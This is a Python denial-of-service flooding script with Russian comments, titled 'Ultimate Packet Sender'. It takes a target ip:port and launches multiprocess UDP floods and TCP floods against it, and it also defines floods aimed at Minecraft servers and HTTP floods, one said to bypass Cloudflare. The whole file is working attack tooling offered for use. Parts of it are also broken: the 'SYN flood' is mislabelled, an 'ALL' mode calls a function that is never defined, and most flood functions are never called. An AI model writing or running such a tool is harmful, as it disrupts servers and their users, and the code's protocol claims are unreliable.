import socket
import random
import threading
import multiprocessing
import sys
import time
import colorama
from colorama import Fore, Style
import signal

colorama.init(autoreset=True)

def animate(stop_event, target_ip, target_port, protocol, duration, workers):
    """Анимация загрузки с выводом информации об атаке."""
    time.sleep(5)  # Задержка перед началом анимации
    while not stop_event.is_set():
        sys.stdout.write(f"\r{Fore.CYAN}🚀 Атака выполняется на {Fore.YELLOW}{target_ip}:{target_port}{Fore.CYAN} | {protocol} | {duration}s | Мощность: {workers} потоков {random.choice(['🔥', '💥', '⚡', '🚀'])} {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

# Layer 4 - UDP Flood
def send_udp_packets(target_ip, target_port, packet_size=1024, duration=10):
    """Функция для отправки множества UDP-пакетов."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)  # Генерация случайных данных для отправки

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packet, (target_ip, target_port))  # Отправка пакетов
        except Exception as e:
            print(f"{Fore.RED}❌ Ошибка UDP: {e}{Style.RESET_ALL}")
            break
    
    sock.close()

# Layer 4 - TCP SYN Flood
def tcp_syn_flood(target_ip, target_port, duration):
    """Атака TCP-SYN flood."""
    print(f"{Fore.YELLOW}🚨 Запущена атака TCP-SYN на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(b"\x00\x00\x00\x00")  # Отправка SYN пакета
    sock.close()

# Layer 7 - Minecraft
def mc_cps_flood(target_ip, target_port, duration):
    """Flood CPS (Clicks per second) для Minecraft серверов."""
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-CPS на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(random._urandom(1024))  # Отправка случайных данных (как имитация CPS)
    sock.close()

def mc_join_flood(target_ip, target_port, duration):
    """Flood Join запросов для Minecraft серверов."""
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-JOIN на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        # Пример Join пакета
        sock.send(b"\x00\x00\x00\x00")  
    sock.close()

def mc_ping_flood(target_ip, target_port, duration):
    """Flood Ping запросов для Minecraft серверов."""
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-PING на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(b"\x01\x00\x00\x00")  # Пример Ping пакета
    sock.close()

def mc_handshake_flood(target_ip, target_port, duration):
    """Flood Handshake запросов для Minecraft серверов."""
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-HANDSHAKE на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(b"\x00\x01\x02\x03\x04")  # Пример Handshake пакета
    sock.close()

def mc_tcpbypass_flood(target_ip, target_port, duration):
    """Flood TCP запросов для Minecraft серверов."""
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-TCPBYPASS на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(random._urandom(1024))  # Отправка произвольных TCP пакетов
    sock.close()

# Layer 7 - HTTP
def http_out_flood(target_ip, target_port, duration):
    """HTTP-OUT flood для обхода защиты."""
    print(f"{Fore.YELLOW}🚨 Запущена атака HTTP-OUT на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    headers = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".format(target_ip)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(headers.encode())
    sock.close()

def http_misc_flood(target_ip, target_port, duration):
    """Universal HTTP flood для обхода защиты Cloudflare и других."""
    print(f"{Fore.YELLOW}🚨 Запущена атака HTTP-MISC на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    headers = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".format(target_ip)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(headers.encode())
    sock.close()

def run_attack(target_ip, target_port, protocol, duration, workers):
    """Функция для запуска многопоточной и многопроцессорной атаки."""
    process_list = []
    stop_event = threading.Event()
    anim_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers), daemon=True)
    anim_thread.start()

    if protocol == "ALL":
        # Все методы для атаки ALL
        run_all_protocols(target_ip, target_port, duration, workers)
        return
    
    for _ in range(workers):
        if protocol == "UDP":
            process = multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration))
        elif protocol == "TCP":
            process = multiprocessing.Process(target=tcp_syn_flood, args=(target_ip, target_port, duration))
        else:
            print(f"{Fore.RED}🚨 Ошибка: поддерживаемые протоколы - TCP, UDP, ALL{Style.RESET_ALL}")
            return
        
        process.start()
        process_list.append(process)
    
    for process in process_list:
        process.join()
    
    stop_event.set()
    sys.stdout.write("\r")
    sys.stdout.flush()

def banner():
    """Вывод баннера"""
    print(f"{Fore.MAGENTA}==================================")
    print(f"🚀 {Fore.YELLOW}💣 Ultimate Packet Sender 💣 {Fore.MAGENTA}🚀")
    print(f"================================== {Style.RESET_ALL}")

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}❌ Атака прервана пользователем.{Style.RESET_ALL}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    banner()
    
    if len(sys.argv) != 4:
        print(f"{Fore.RED}⚠️ Использование: python z.py ip:port protocol time{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    protocol = sys.argv[2].upper()
    duration = int(sys.argv[3])
    workers = multiprocessing.cpu_count() * 2  # Использует в 2 раза больше потоков, чем ядер
    
    try:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
    except ValueError:
        print(f"{Fore.RED}🚨 Ошибка: неправильный формат ip:port{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}💥 Атака началась на {target_ip}:{target_port} через {protocol} на {duration} секунд! 🔥{Style.RESET_ALL}")
    run_attack(target_ip, target_port, protocol, duration, workers)
    print(f"{Fore.BLUE}✅ 🎯 Отправка пакетов завершена!{Style.RESET_ALL}")
